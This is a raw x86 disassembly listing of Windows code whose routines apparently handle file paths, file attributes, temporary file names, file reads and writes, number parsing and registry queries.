  4059d3:	56                   	push   %esi
  4059d4:	e8 57 06 00 00       	call   0x406030
  4059d9:	8d 04 46             	lea    (%esi,%eax,2),%eax
  4059dc:	50                   	push   %eax
  4059dd:	56                   	push   %esi
  4059de:	ff 15 fc 71 40 00    	call   *0x4071fc
  4059e4:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  4059e8:	74 0b                	je     0x4059f5
  4059ea:	68 14 90 40 00       	push   $0x409014
  4059ef:	56                   	push   %esi
  4059f0:	e8 41 06 00 00       	call   0x406036
  4059f5:	8b c6                	mov    %esi,%eax
  4059f7:	5e                   	pop    %esi
  4059f8:	c2 04 00             	ret    $0x4
  4059fb:	8b 44 24 04          	mov    0x4(%esp),%eax
  4059ff:	eb 0e                	jmp    0x405a0f
  405a01:	66 3b 4c 24 08       	cmp    0x8(%esp),%cx
  405a06:	74 0f                	je     0x405a17
  405a08:	50                   	push   %eax
  405a09:	ff 15 4c 72 40 00    	call   *0x40724c
  405a0f:	66 8b 08             	mov    (%eax),%cx
  405a12:	66 85 c9             	test   %cx,%cx
  405a15:	75 ea                	jne    0x405a01
  405a17:	c2 08 00             	ret    $0x8
  405a1a:	56                   	push   %esi
  405a1b:	8b 74 24 08          	mov    0x8(%esp),%esi
  405a1f:	56                   	push   %esi
  405a20:	e8 0b 06 00 00       	call   0x406030
  405a25:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405a28:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405a2c:	74 0c                	je     0x405a3a
  405a2e:	50                   	push   %eax
  405a2f:	56                   	push   %esi
  405a30:	ff 15 fc 71 40 00    	call   *0x4071fc
  405a36:	3b c6                	cmp    %esi,%eax
  405a38:	77 ee                	ja     0x405a28
  405a3a:	66 83 20 00          	andw   $0x0,(%eax)
  405a3e:	83 c0 02             	add    $0x2,%eax
  405a41:	5e                   	pop    %esi
  405a42:	c2 04 00             	ret    $0x4
  405a45:	8b 54 24 04          	mov    0x4(%esp),%edx
  405a49:	66 8b 0a             	mov    (%edx),%cx
  405a4c:	8b c1                	mov    %ecx,%eax
  405a4e:	0c 20                	or     $0x20,%al
  405a50:	66 83 f9 5c          	cmp    $0x5c,%cx
  405a54:	75 06                	jne    0x405a5c
  405a56:	66 39 4a 02          	cmp    %cx,0x2(%edx)
  405a5a:	74 13                	je     0x405a6f
  405a5c:	66 3d 61 00          	cmp    $0x61,%ax
  405a60:	72 12                	jb     0x405a74
  405a62:	66 3d 7a 00          	cmp    $0x7a,%ax
  405a66:	77 0c                	ja     0x405a74
  405a68:	66 83 7a 02 3a       	cmpw   $0x3a,0x2(%edx)
  405a6d:	75 05                	jne    0x405a74
  405a6f:	33 c0                	xor    %eax,%eax
  405a71:	40                   	inc    %eax
  405a72:	eb 02                	jmp    0x405a76
  405a74:	33 c0                	xor    %eax,%eax
  405a76:	c2 04 00             	ret    $0x4
  405a79:	53                   	push   %ebx
  405a7a:	56                   	push   %esi
  405a7b:	8b 35 4c 72 40 00    	mov    0x40724c,%esi
  405a81:	57                   	push   %edi
  405a82:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405a86:	57                   	push   %edi
  405a87:	ff d6                	call   *%esi
  405a89:	8b d8                	mov    %eax,%ebx
  405a8b:	53                   	push   %ebx
  405a8c:	ff d6                	call   *%esi
  405a8e:	66 8b 0f             	mov    (%edi),%cx
  405a91:	66 85 c9             	test   %cx,%cx
  405a94:	74 12                	je     0x405aa8
  405a96:	66 83 3b 3a          	cmpw   $0x3a,(%ebx)
  405a9a:	75 0c                	jne    0x405aa8
  405a9c:	66 83 7b 02 5c       	cmpw   $0x5c,0x2(%ebx)
  405aa1:	75 05                	jne    0x405aa8
  405aa3:	50                   	push   %eax
  405aa4:	ff d6                	call   *%esi
  405aa6:	eb 28                	jmp    0x405ad0
  405aa8:	66 83 f9 5c          	cmp    $0x5c,%cx
  405aac:	75 20                	jne    0x405ace
  405aae:	66 39 4f 02          	cmp    %cx,0x2(%edi)
  405ab2:	75 1a                	jne    0x405ace
  405ab4:	6a 02                	push   $0x2
  405ab6:	5e                   	pop    %esi
  405ab7:	6a 5c                	push   $0x5c
  405ab9:	50                   	push   %eax
  405aba:	4e                   	dec    %esi
  405abb:	e8 3b ff ff ff       	call   0x4059fb
  405ac0:	66 83 38 00          	cmpw   $0x0,(%eax)
  405ac4:	74 08                	je     0x405ace
  405ac6:	40                   	inc    %eax
  405ac7:	40                   	inc    %eax
  405ac8:	85 f6                	test   %esi,%esi
  405aca:	75 eb                	jne    0x405ab7
  405acc:	eb 02                	jmp    0x405ad0
  405ace:	33 c0                	xor    %eax,%eax
  405ad0:	5f                   	pop    %edi
  405ad1:	5e                   	pop    %esi
  405ad2:	5b                   	pop    %ebx
  405ad3:	c2 04 00             	ret    $0x4
  405ad6:	56                   	push   %esi
  405ad7:	57                   	push   %edi
  405ad8:	ff 74 24 0c          	push   0xc(%esp)
  405adc:	be f0 4e 42 00       	mov    $0x424ef0,%esi
  405ae1:	56                   	push   %esi
  405ae2:	e8 33 05 00 00       	call   0x40601a
  405ae7:	56                   	push   %esi
  405ae8:	e8 8c ff ff ff       	call   0x405a79
  405aed:	8b f8                	mov    %eax,%edi
  405aef:	85 ff                	test   %edi,%edi
  405af1:	75 04                	jne    0x405af7
  405af3:	33 c0                	xor    %eax,%eax
  405af5:	eb 58                	jmp    0x405b4f
  405af7:	57                   	push   %edi
  405af8:	e8 b1 07 00 00       	call   0x4062ae
  405afd:	f6 05 18 92 42 00 80 	testb  $0x80,0x429218
  405b04:	74 0e                	je     0x405b14
  405b06:	66 8b 07             	mov    (%edi),%ax
  405b09:	66 85 c0             	test   %ax,%ax
  405b0c:	74 e5                	je     0x405af3
  405b0e:	66 3d 5c 00          	cmp    $0x5c,%ax
  405b12:	74 df                	je     0x405af3
  405b14:	2b fe                	sub    %esi,%edi
  405b16:	d1 ff                	sar    $1,%edi
  405b18:	eb 14                	jmp    0x405b2e
  405b1a:	e8 3e 08 00 00       	call   0x40635d
  405b1f:	85 c0                	test   %eax,%eax
  405b21:	74 05                	je     0x405b28
  405b23:	f6 00 10             	testb  $0x10,(%eax)
  405b26:	74 cb                	je     0x405af3
  405b28:	56                   	push   %esi
  405b29:	e8 ec fe ff ff       	call   0x405a1a
  405b2e:	56                   	push   %esi
  405b2f:	e8 fc 04 00 00       	call   0x406030
  405b34:	3b c7                	cmp    %edi,%eax
  405b36:	56                   	push   %esi
  405b37:	7f e1                	jg     0x405b1a
  405b39:	e8 90 fe ff ff       	call   0x4059ce
  405b3e:	56                   	push   %esi
  405b3f:	ff 15 74 70 40 00    	call   *0x407074
  405b45:	33 c9                	xor    %ecx,%ecx
  405b47:	83 f8 ff             	cmp    $0xffffffff,%eax
  405b4a:	0f 95 c1             	setne  %cl
  405b4d:	8b c1                	mov    %ecx,%eax
  405b4f:	5f                   	pop    %edi
  405b50:	5e                   	pop    %esi
  405b51:	c2 04 00             	ret    $0x4
  405b54:	55                   	push   %ebp
  405b55:	8b ec                	mov    %esp,%ebp
  405b57:	51                   	push   %ecx
  405b58:	53                   	push   %ebx
  405b59:	56                   	push   %esi
  405b5a:	57                   	push   %edi
  405b5b:	8b 3d 5c 71 40 00    	mov    0x40715c,%edi
  405b61:	ff 75 0c             	push   0xc(%ebp)
  405b64:	ff d7                	call   *%edi
  405b66:	8b 75 08             	mov    0x8(%ebp),%esi
  405b69:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405b6c:	eb 27                	jmp    0x405b95
  405b6e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405b71:	ff 75 0c             	push   0xc(%ebp)
  405b74:	8a 1c 30             	mov    (%eax,%esi,1),%bl
  405b77:	80 24 30 00          	andb   $0x0,(%eax,%esi,1)
  405b7b:	56                   	push   %esi
  405b7c:	ff 15 dc 70 40 00    	call   *0x4070dc
  405b82:	85 c0                	test   %eax,%eax
  405b84:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405b87:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  405b8a:	74 1a                	je     0x405ba6
  405b8c:	56                   	push   %esi
  405b8d:	ff 15 00 72 40 00    	call   *0x407200
  405b93:	8b f0                	mov    %eax,%esi
  405b95:	56                   	push   %esi
  405b96:	ff d7                	call   *%edi
  405b98:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  405b9b:	7d d1                	jge    0x405b6e
  405b9d:	33 c0                	xor    %eax,%eax
  405b9f:	5f                   	pop    %edi
  405ba0:	5e                   	pop    %esi
  405ba1:	5b                   	pop    %ebx
  405ba2:	c9                   	leave
  405ba3:	c2 08 00             	ret    $0x8
  405ba6:	8b c6                	mov    %esi,%eax
  405ba8:	eb f5                	jmp    0x405b9f
  405baa:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  405bae:	56                   	push   %esi
  405baf:	8b 74 24 10          	mov    0x10(%esp),%esi
  405bb3:	85 f6                	test   %esi,%esi
  405bb5:	76 0f                	jbe    0x405bc6
  405bb7:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405bbb:	2b c1                	sub    %ecx,%eax
  405bbd:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  405bc0:	88 11                	mov    %dl,(%ecx)
  405bc2:	41                   	inc    %ecx
  405bc3:	4e                   	dec    %esi
  405bc4:	75 f7                	jne    0x405bbd
  405bc6:	5e                   	pop    %esi
  405bc7:	c2 0c 00             	ret    $0xc
  405bca:	56                   	push   %esi
  405bcb:	ff 74 24 08          	push   0x8(%esp)
  405bcf:	ff 15 74 70 40 00    	call   *0x407074
  405bd5:	8b f0                	mov    %eax,%esi
  405bd7:	83 fe ff             	cmp    $0xffffffff,%esi
  405bda:	74 0d                	je     0x405be9
  405bdc:	24 fe                	and    $0xfe,%al
  405bde:	50                   	push   %eax
  405bdf:	ff 74 24 0c          	push   0xc(%esp)
  405be3:	ff 15 90 70 40 00    	call   *0x407090
  405be9:	8b c6                	mov    %esi,%eax
  405beb:	5e                   	pop    %esi
  405bec:	c2 04 00             	ret    $0x4
  405bef:	ff 74 24 04          	push   0x4(%esp)
  405bf3:	ff 15 74 70 40 00    	call   *0x407074
  405bf9:	8b c8                	mov    %eax,%ecx
  405bfb:	6a 00                	push   $0x0
  405bfd:	41                   	inc    %ecx
  405bfe:	f7 d9                	neg    %ecx
  405c00:	1b c9                	sbb    %ecx,%ecx
  405c02:	23 c8                	and    %eax,%ecx
  405c04:	51                   	push   %ecx
  405c05:	ff 74 24 14          	push   0x14(%esp)
  405c09:	6a 00                	push   $0x0
  405c0b:	6a 01                	push   $0x1
  405c0d:	ff 74 24 1c          	push   0x1c(%esp)
  405c11:	ff 74 24 1c          	push   0x1c(%esp)
  405c15:	ff 15 e0 70 40 00    	call   *0x4070e0
  405c1b:	c2 0c 00             	ret    $0xc
  405c1e:	55                   	push   %ebp
  405c1f:	8b ec                	mov    %esp,%ebp
  405c21:	51                   	push   %ecx
  405c22:	51                   	push   %ecx
  405c23:	56                   	push   %esi
  405c24:	8b 75 08             	mov    0x8(%ebp),%esi
  405c27:	57                   	push   %edi
  405c28:	6a 64                	push   $0x64
  405c2a:	5f                   	pop    %edi
  405c2b:	a1 50 95 40 00       	mov    0x409550,%eax
  405c30:	4f                   	dec    %edi
  405c31:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405c34:	a1 54 95 40 00       	mov    0x409554,%eax
  405c39:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405c3c:	ff 15 80 70 40 00    	call   *0x407080
  405c42:	6a 1a                	push   $0x1a
  405c44:	33 d2                	xor    %edx,%edx
  405c46:	59                   	pop    %ecx
  405c47:	f7 f1                	div    %ecx
  405c49:	56                   	push   %esi
  405c4a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405c4d:	6a 00                	push   $0x0
  405c4f:	50                   	push   %eax
  405c50:	ff 75 0c             	push   0xc(%ebp)
  405c53:	66 01 55 fc          	add    %dx,-0x4(%ebp)
  405c57:	ff 15 e4 70 40 00    	call   *0x4070e4
  405c5d:	85 c0                	test   %eax,%eax
  405c5f:	75 0d                	jne    0x405c6e
  405c61:	85 ff                	test   %edi,%edi
  405c63:	75 c6                	jne    0x405c2b
  405c65:	66 21 3e             	and    %di,(%esi)
  405c68:	5f                   	pop    %edi
  405c69:	5e                   	pop    %esi
  405c6a:	c9                   	leave
  405c6b:	c2 08 00             	ret    $0x8
  405c6e:	8b c6                	mov    %esi,%eax
  405c70:	eb f6                	jmp    0x405c68
  405c72:	55                   	push   %ebp
  405c73:	8b ec                	mov    %esp,%ebp
  405c75:	56                   	push   %esi
  405c76:	8b 75 10             	mov    0x10(%ebp),%esi
  405c79:	8d 45 10             	lea    0x10(%ebp),%eax
  405c7c:	6a 00                	push   $0x0
  405c7e:	50                   	push   %eax
  405c7f:	56                   	push   %esi
  405c80:	ff 75 0c             	push   0xc(%ebp)
  405c83:	ff 75 08             	push   0x8(%ebp)
  405c86:	ff 15 4c 71 40 00    	call   *0x40714c
  405c8c:	85 c0                	test   %eax,%eax
  405c8e:	74 0a                	je     0x405c9a
  405c90:	3b 75 10             	cmp    0x10(%ebp),%esi
  405c93:	75 05                	jne    0x405c9a
  405c95:	33 c0                	xor    %eax,%eax
  405c97:	40                   	inc    %eax
  405c98:	eb 02                	jmp    0x405c9c
  405c9a:	33 c0                	xor    %eax,%eax
  405c9c:	5e                   	pop    %esi
  405c9d:	5d                   	pop    %ebp
  405c9e:	c2 0c 00             	ret    $0xc
  405ca1:	55                   	push   %ebp
  405ca2:	8b ec                	mov    %esp,%ebp
  405ca4:	56                   	push   %esi
  405ca5:	8b 75 10             	mov    0x10(%ebp),%esi
  405ca8:	8d 45 10             	lea    0x10(%ebp),%eax
  405cab:	6a 00                	push   $0x0
  405cad:	50                   	push   %eax
  405cae:	56                   	push   %esi
  405caf:	ff 75 0c             	push   0xc(%ebp)
  405cb2:	ff 75 08             	push   0x8(%ebp)
  405cb5:	ff 15 e8 70 40 00    	call   *0x4070e8
  405cbb:	85 c0                	test   %eax,%eax
  405cbd:	74 0a                	je     0x405cc9
  405cbf:	3b 75 10             	cmp    0x10(%ebp),%esi
  405cc2:	75 05                	jne    0x405cc9
  405cc4:	33 c0                	xor    %eax,%eax
  405cc6:	40                   	inc    %eax
  405cc7:	eb 02                	jmp    0x405ccb
  405cc9:	33 c0                	xor    %eax,%eax
  405ccb:	5e                   	pop    %esi
  405ccc:	5d                   	pop    %ebp
  405ccd:	c2 0c 00             	ret    $0xc
  405cd0:	55                   	push   %ebp
  405cd1:	8b ec                	mov    %esp,%ebp
  405cd3:	53                   	push   %ebx
  405cd4:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405cd7:	56                   	push   %esi
  405cd8:	8b 35 48 71 40 00    	mov    0x407148,%esi
  405cde:	57                   	push   %edi
  405cdf:	33 ff                	xor    %edi,%edi
  405ce1:	6a 01                	push   $0x1
  405ce3:	57                   	push   %edi
  405ce4:	57                   	push   %edi
  405ce5:	53                   	push   %ebx
  405ce6:	ff d6                	call   *%esi
  405ce8:	85 c0                	test   %eax,%eax
  405cea:	75 53                	jne    0x405d3f
  405cec:	8d 45 0a             	lea    0xa(%ebp),%eax
  405cef:	6a 02                	push   $0x2
  405cf1:	50                   	push   %eax
  405cf2:	53                   	push   %ebx
  405cf3:	e8 7a ff ff ff       	call   0x405c72
  405cf8:	85 c0                	test   %eax,%eax
  405cfa:	74 10                	je     0x405d0c
  405cfc:	80 7d 0a ff          	cmpb   $0xff,0xa(%ebp)
  405d00:	75 0a                	jne    0x405d0c
  405d02:	80 7d 0b fe          	cmpb   $0xfe,0xb(%ebp)
  405d06:	75 04                	jne    0x405d0c
  405d08:	33 c0                	xor    %eax,%eax
  405d0a:	eb 36                	jmp    0x405d42
  405d0c:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  405d0f:	74 28                	je     0x405d39
  405d11:	6a 01                	push   $0x1
  405d13:	57                   	push   %edi
  405d14:	57                   	push   %edi
  405d15:	53                   	push   %ebx
  405d16:	ff d6                	call   *%esi
  405d18:	85 c0                	test   %eax,%eax
  405d1a:	75 1d                	jne    0x405d39
  405d1c:	6a 02                	push   $0x2
  405d1e:	68 1c 74 40 00       	push   $0x40741c
  405d23:	53                   	push   %ebx
  405d24:	e8 78 ff ff ff       	call   0x405ca1
  405d29:	f7 d8                	neg    %eax
  405d2b:	1b c0                	sbb    %eax,%eax
  405d2d:	25 fb bf ff 7f       	and    $0x7fffbffb,%eax
  405d32:	05 05 40 00 80       	add    $0x80004005,%eax
  405d37:	eb 09                	jmp    0x405d42
  405d39:	57                   	push   %edi
  405d3a:	57                   	push   %edi
  405d3b:	57                   	push   %edi
  405d3c:	53                   	push   %ebx
  405d3d:	ff d6                	call   *%esi
  405d3f:	33 c0                	xor    %eax,%eax
  405d41:	40                   	inc    %eax
  405d42:	5f                   	pop    %edi
  405d43:	5e                   	pop    %esi
  405d44:	5b                   	pop    %ebx
  405d45:	5d                   	pop    %ebp
  405d46:	c2 08 00             	ret    $0x8
  405d49:	53                   	push   %ebx
  405d4a:	55                   	push   %ebp
  405d4b:	56                   	push   %esi
  405d4c:	57                   	push   %edi
  405d4d:	bb 88 5d 42 00       	mov    $0x425d88,%ebx
  405d52:	68 74 95 40 00       	push   $0x409574
  405d57:	53                   	push   %ebx
  405d58:	ff 15 f0 70 40 00    	call   *0x4070f0
  405d5e:	8b 74 24 18          	mov    0x18(%esp),%esi
  405d62:	8b 2d 10 71 40 00    	mov    0x407110,%ebp
  405d68:	85 f6                	test   %esi,%esi
  405d6a:	bf 00 04 00 00       	mov    $0x400,%edi
  405d6f:	74 26                	je     0x405d97
  405d71:	6a 01                	push   $0x1
  405d73:	6a 00                	push   $0x0
  405d75:	56                   	push   %esi
  405d76:	e8 74 fe ff ff       	call   0x405bef
  405d7b:	50                   	push   %eax
  405d7c:	ff 15 20 71 40 00    	call   *0x407120
  405d82:	57                   	push   %edi
  405d83:	53                   	push   %ebx
  405d84:	56                   	push   %esi
  405d85:	ff d5                	call   *%ebp
  405d87:	85 c0                	test   %eax,%eax
  405d89:	0f 84 27 01 00 00    	je     0x405eb6
  405d8f:	3b c7                	cmp    %edi,%eax
  405d91:	0f 8f 1f 01 00 00    	jg     0x405eb6
  405d97:	be 88 65 42 00       	mov    $0x426588,%esi
  405d9c:	57                   	push   %edi
  405d9d:	56                   	push   %esi
  405d9e:	ff 74 24 1c          	push   0x1c(%esp)
  405da2:	ff d5                	call   *%ebp
  405da4:	85 c0                	test   %eax,%eax
  405da6:	0f 84 0a 01 00 00    	je     0x405eb6
  405dac:	3b c7                	cmp    %edi,%eax
  405dae:	0f 8f 02 01 00 00    	jg     0x405eb6
  405db4:	56                   	push   %esi
  405db5:	53                   	push   %ebx
  405db6:	68 68 95 40 00       	push   $0x409568
  405dbb:	68 88 59 42 00       	push   $0x425988
  405dc0:	ff 15 04 72 40 00    	call   *0x407204
  405dc6:	8b d8                	mov    %eax,%ebx
  405dc8:	a1 10 92 42 00       	mov    0x429210,%eax
  405dcd:	83 c4 10             	add    $0x10,%esp
  405dd0:	ff b0 28 01 00 00    	push   0x128(%eax)
  405dd6:	56                   	push   %esi
  405dd7:	e8 60 02 00 00       	call   0x40603c
  405ddc:	6a 04                	push   $0x4
  405dde:	68 00 00 00 c0       	push   $0xc0000000
  405de3:	56                   	push   %esi
  405de4:	e8 06 fe ff ff       	call   0x405bef
  405de9:	8b e8                	mov    %eax,%ebp
  405deb:	83 fd ff             	cmp    $0xffffffff,%ebp
  405dee:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  405df2:	0f 84 be 00 00 00    	je     0x405eb6
  405df8:	6a 00                	push   $0x0
  405dfa:	55                   	push   %ebp
  405dfb:	ff 15 84 70 40 00    	call   *0x407084
  405e01:	8b f8                	mov    %eax,%edi
  405e03:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  405e07:	50                   	push   %eax
  405e08:	6a 40                	push   $0x40
  405e0a:	ff 15 0c 71 40 00    	call   *0x40710c
  405e10:	8b f0                	mov    %eax,%esi
  405e12:	85 f6                	test   %esi,%esi
  405e14:	0f 84 95 00 00 00    	je     0x405eaf
  405e1a:	57                   	push   %edi
  405e1b:	56                   	push   %esi
  405e1c:	55                   	push   %ebp
  405e1d:	e8 50 fe ff ff       	call   0x405c72
  405e22:	85 c0                	test   %eax,%eax
  405e24:	0f 84 85 00 00 00    	je     0x405eaf
  405e2a:	68 5c 95 40 00       	push   $0x40955c
  405e2f:	56                   	push   %esi
  405e30:	e8 1f fd ff ff       	call   0x405b54
  405e35:	85 c0                	test   %eax,%eax
  405e37:	75 14                	jne    0x405e4d
  405e39:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  405e3c:	68 5c 95 40 00       	push   $0x40955c
  405e41:	50                   	push   %eax
  405e42:	ff 15 ec 70 40 00    	call   *0x4070ec
  405e48:	83 c7 0a             	add    $0xa,%edi
  405e4b:	eb 35                	jmp    0x405e82
  405e4d:	83 c0 0a             	add    $0xa,%eax
  405e50:	68 58 95 40 00       	push   $0x409558
  405e55:	50                   	push   %eax
  405e56:	e8 f9 fc ff ff       	call   0x405b54
  405e5b:	8b e8                	mov    %eax,%ebp
  405e5d:	85 ed                	test   %ebp,%ebp
  405e5f:	74 1d                	je     0x405e7e
  405e61:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  405e64:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  405e67:	eb 06                	jmp    0x405e6f
  405e69:	8a 11                	mov    (%ecx),%dl
  405e6b:	88 10                	mov    %dl,(%eax)
  405e6d:	48                   	dec    %eax
  405e6e:	49                   	dec    %ecx
  405e6f:	3b cd                	cmp    %ebp,%ecx
  405e71:	77 f6                	ja     0x405e69
  405e73:	2b ee                	sub    %esi,%ebp
  405e75:	45                   	inc    %ebp
  405e76:	8b c5                	mov    %ebp,%eax
  405e78:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  405e7c:	eb 06                	jmp    0x405e84
  405e7e:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  405e82:	8b c7                	mov    %edi,%eax
  405e84:	53                   	push   %ebx
  405e85:	03 c6                	add    %esi,%eax
  405e87:	68 88 59 42 00       	push   $0x425988
  405e8c:	50                   	push   %eax
  405e8d:	e8 18 fd ff ff       	call   0x405baa
  405e92:	33 c0                	xor    %eax,%eax
  405e94:	50                   	push   %eax
  405e95:	50                   	push   %eax
  405e96:	50                   	push   %eax
  405e97:	55                   	push   %ebp
  405e98:	ff 15 48 71 40 00    	call   *0x407148
  405e9e:	03 fb                	add    %ebx,%edi
  405ea0:	57                   	push   %edi
  405ea1:	56                   	push   %esi
  405ea2:	55                   	push   %ebp
  405ea3:	e8 f9 fd ff ff       	call   0x405ca1
  405ea8:	56                   	push   %esi
  405ea9:	ff 15 08 71 40 00    	call   *0x407108
  405eaf:	55                   	push   %ebp
  405eb0:	ff 15 20 71 40 00    	call   *0x407120
  405eb6:	5f                   	pop    %edi
  405eb7:	5e                   	pop    %esi
  405eb8:	5d                   	pop    %ebp
  405eb9:	5b                   	pop    %ebx
  405eba:	c3                   	ret
  405ebb:	6a 05                	push   $0x5
  405ebd:	ff 74 24 0c          	push   0xc(%esp)
  405ec1:	ff 74 24 0c          	push   0xc(%esp)
  405ec5:	ff 15 f4 70 40 00    	call   *0x4070f4
  405ecb:	85 c0                	test   %eax,%eax
  405ecd:	75 0f                	jne    0x405ede
  405ecf:	ff 74 24 08          	push   0x8(%esp)
  405ed3:	ff 74 24 08          	push   0x8(%esp)
  405ed7:	e8 6d fe ff ff       	call   0x405d49
  405edc:	59                   	pop    %ecx
  405edd:	59                   	pop    %ecx
  405ede:	ff 05 90 92 42 00    	incl   0x429290
  405ee4:	c2 08 00             	ret    $0x8
  405ee7:	55                   	push   %ebp
  405ee8:	8b ec                	mov    %esp,%ebp
  405eea:	56                   	push   %esi
  405eeb:	8d 45 18             	lea    0x18(%ebp),%eax
  405eee:	57                   	push   %edi
  405eef:	50                   	push   %eax
  405ef0:	8b 45 18             	mov    0x18(%ebp),%eax
  405ef3:	33 ff                	xor    %edi,%edi
  405ef5:	f7 d8                	neg    %eax
  405ef7:	1b c0                	sbb    %eax,%eax
  405ef9:	8b 75 14             	mov    0x14(%ebp),%esi
  405efc:	25 00 01 00 00       	and    $0x100,%eax
  405f01:	0d 19 00 02 00       	or     $0x20019,%eax
  405f06:	66 89 3e             	mov    %di,(%esi)
  405f09:	50                   	push   %eax
  405f0a:	57                   	push   %edi
  405f0b:	ff 75 0c             	push   0xc(%ebp)
  405f0e:	ff 75 08             	push   0x8(%ebp)
  405f11:	ff 15 14 70 40 00    	call   *0x407014
  405f17:	85 c0                	test   %eax,%eax
  405f19:	75 40                	jne    0x405f5b
  405f1b:	8d 45 0c             	lea    0xc(%ebp),%eax
  405f1e:	c7 45 0c 00 08 00 00 	movl   $0x800,0xc(%ebp)
  405f25:	50                   	push   %eax
  405f26:	8d 45 14             	lea    0x14(%ebp),%eax
  405f29:	56                   	push   %esi
  405f2a:	50                   	push   %eax
  405f2b:	57                   	push   %edi
  405f2c:	ff 75 10             	push   0x10(%ebp)
  405f2f:	ff 75 18             	push   0x18(%ebp)
  405f32:	ff 15 2c 70 40 00    	call   *0x40702c
  405f38:	85 c0                	test   %eax,%eax
  405f3a:	75 0c                	jne    0x405f48
  405f3c:	83 7d 14 01          	cmpl   $0x1,0x14(%ebp)
  405f40:	74 09                	je     0x405f4b
  405f42:	83 7d 14 02          	cmpl   $0x2,0x14(%ebp)
  405f46:	74 03                	je     0x405f4b
  405f48:	66 89 3e             	mov    %di,(%esi)
  405f4b:	ff 75 18             	push   0x18(%ebp)
  405f4e:	66 89 be fe 07 00 00 	mov    %di,0x7fe(%esi)
  405f55:	ff 15 20 70 40 00    	call   *0x407020
  405f5b:	5f                   	pop    %edi
  405f5c:	5e                   	pop    %esi
  405f5d:	5d                   	pop    %ebp
  405f5e:	c2 14 00             	ret    $0x14
  405f61:	ff 74 24 08          	push   0x8(%esp)
  405f65:	68 20 74 40 00       	push   $0x407420
  405f6a:	ff 74 24 0c          	push   0xc(%esp)
  405f6e:	ff 15 e0 71 40 00    	call   *0x4071e0
  405f74:	83 c4 0c             	add    $0xc,%esp
  405f77:	c2 08 00             	ret    $0x8
  405f7a:	55                   	push   %ebp
  405f7b:	8b ec                	mov    %esp,%ebp
  405f7d:	51                   	push   %ecx
  405f7e:	51                   	push   %ecx
  405f7f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405f82:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405f86:	53                   	push   %ebx
  405f87:	56                   	push   %esi
  405f88:	66 83 39 2d          	cmpw   $0x2d,(%ecx)
  405f8c:	6a 0a                	push   $0xa
  405f8e:	58                   	pop    %eax
  405f8f:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  405f96:	6a 39                	push   $0x39
  405f98:	5b                   	pop    %ebx
  405f99:	75 06                	jne    0x405fa1
  405f9b:	41                   	inc    %ecx
  405f9c:	41                   	inc    %ecx
  405f9d:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  405fa1:	66 83 39 30          	cmpw   $0x30,(%ecx)
  405fa5:	75 27                	jne    0x405fce
  405fa7:	41                   	inc    %ecx
  405fa8:	41                   	inc    %ecx
  405fa9:	66 8b 11             	mov    (%ecx),%dx
  405fac:	66 83 fa 30          	cmp    $0x30,%dx
  405fb0:	72 0c                	jb     0x405fbe
  405fb2:	66 83 fa 37          	cmp    $0x37,%dx
  405fb6:	77 06                	ja     0x405fbe
  405fb8:	6a 08                	push   $0x8
  405fba:	58                   	pop    %eax
  405fbb:	6a 37                	push   $0x37
  405fbd:	5b                   	pop    %ebx
  405fbe:	0f b7 d2             	movzwl %dx,%edx
  405fc1:	83 e2 df             	and    $0xffffffdf,%edx
  405fc4:	83 fa 58             	cmp    $0x58,%edx
  405fc7:	75 05                	jne    0x405fce
  405fc9:	6a 10                	push   $0x10
  405fcb:	41                   	inc    %ecx
  405fcc:	58                   	pop    %eax
  405fcd:	41                   	inc    %ecx
  405fce:	0f b7 11             	movzwl (%ecx),%edx
  405fd1:	41                   	inc    %ecx
  405fd2:	41                   	inc    %ecx
  405fd3:	83 fa 30             	cmp    $0x30,%edx
  405fd6:	7c 0c                	jl     0x405fe4
  405fd8:	0f b7 f3             	movzwl %bx,%esi
  405fdb:	3b d6                	cmp    %esi,%edx
  405fdd:	7f 05                	jg     0x405fe4
  405fdf:	83 ea 30             	sub    $0x30,%edx
  405fe2:	eb 1b                	jmp    0x405fff
  405fe4:	66 3d 10 00          	cmp    $0x10,%ax
  405fe8:	75 23                	jne    0x40600d
  405fea:	8b f2                	mov    %edx,%esi
  405fec:	83 e6 df             	and    $0xffffffdf,%esi
  405fef:	83 fe 41             	cmp    $0x41,%esi
  405ff2:	7c 19                	jl     0x40600d
  405ff4:	83 fe 46             	cmp    $0x46,%esi
  405ff7:	7f 14                	jg     0x40600d
  405ff9:	83 e2 07             	and    $0x7,%edx
  405ffc:	83 c2 09             	add    $0x9,%edx
  405fff:	0f b7 f0             	movzwl %ax,%esi
  406002:	0f af 75 fc          	imul   -0x4(%ebp),%esi
  406006:	03 f2                	add    %edx,%esi
  406008:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40600b:	eb c1                	jmp    0x405fce
  40600d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406010:	5e                   	pop    %esi
  406011:	0f af 45 fc          	imul   -0x4(%ebp),%eax
  406015:	5b                   	pop    %ebx
  406016:	c9                   	leave
  406017:	c2 04 00             	ret    $0x4
  40601a:	68 00 04 00 00       	push   $0x400
  40601f:	ff 74 24 0c          	push   0xc(%esp)
